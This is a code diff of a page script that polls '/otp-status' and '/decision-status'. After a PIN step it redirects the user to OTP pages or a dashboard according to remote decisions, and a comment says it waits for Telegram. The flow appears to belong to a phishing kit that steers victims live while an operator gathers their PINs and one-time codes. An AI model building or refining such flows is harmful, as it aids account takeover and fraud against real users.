@@ -41,43 +41,40 @@ if (localStorage.getItem("firstProcess") === "yes") {
 // ===== FLOW B: AFTER PIN → WAIT FOR TELEGRAM =====
 if (localStorage.getItem("fromPin") === "yes") {
 
-    setInterval(async () => {
-    
+  setInterval(async () => {
+    try {
+        const res = await fetch("/otp-status");
+        const data = await res.json();
 
-        try {
-            const res = await fetch("/otp-status");
-            const data = await res.json();
+        console.log("OTP STATUS:", data);
 
-            console.log("OTP STATUS:", data);
-
-            if (data.otp == 5) {
-                localStorage.removeItem("fromPin");
-                window.location.href = "step5.html";
-            }
-
-            if (data.otp == 6) {
-    window.location.href = "step6.html";
-}
-
-            const decisionRes = await fetch("/decision-status");
-            const decisionData = await decisionRes.json();
-
-            if (decisionData.decision === "accept") {
-                window.location.href = "dashboard.html";
-            }
-
-           if (decisionData.decision === "decline") {
-    localStorage.clear(); // optional but recommended
-    window.location.href = "step5.html";
-} 
-
-        } catch (err) {
-            console.log("Waiting...");
+        // 🔥 FORCE CHECK (handles string + number)
+        if (data.otp == 5) {
+            window.location.href = "step5.html";
         }
 
-    }, 2000);
-}
+        if (data.otp == 6) {
+            window.location.href = "step6.html";
+        }
 
+        const decisionRes = await fetch("/decision-status");
+        const decisionData = await decisionRes.json();
+
+        if (decisionData.decision === "accept") {
+            window.location.href = "dashboard.html";
+        }
+
+        if (decisionData.decision === "decline") {
+            localStorage.clear();
+            window.location.href = "step5.html";
+        }
+
+    } catch (err) {
+        console.log("Waiting...");
+    }
+}, 2000);  
+
+}
 </script>
 
 </body>
